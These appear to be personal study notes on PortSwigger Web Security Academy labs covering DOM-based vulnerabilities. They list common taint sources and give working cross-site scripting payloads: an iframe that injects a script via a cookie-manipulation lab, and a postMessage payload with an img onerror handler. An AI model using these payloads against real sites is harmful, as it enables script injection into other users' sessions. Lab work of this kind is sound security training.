## Common sources

The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:
'''
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
'''

## LAB 1
- <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
- https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation

## Lab 2
- I saw the following in html code
'''
                     <div id='ads'>
                    </div>
                    <script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
                    </script>
'''
- After googling I found that '''window.postMessage('<img src=1 href=1 onerror="javascript:alert(1)"></img>', 'https://0ac90071041154dd804285ae00110042.web-security-academy.net/');''' send a message, and the event listener would see and append it.
- The following iframe sent message to parent url.
'''
<iframe src="https://0ac90071041154dd804285ae00110042.web-security-academy.net/" width="100%" height="100%"  onload="this.contentWindow.postMessage('<img src=1 href=1 onerror=print()></img>', '*')">

'''
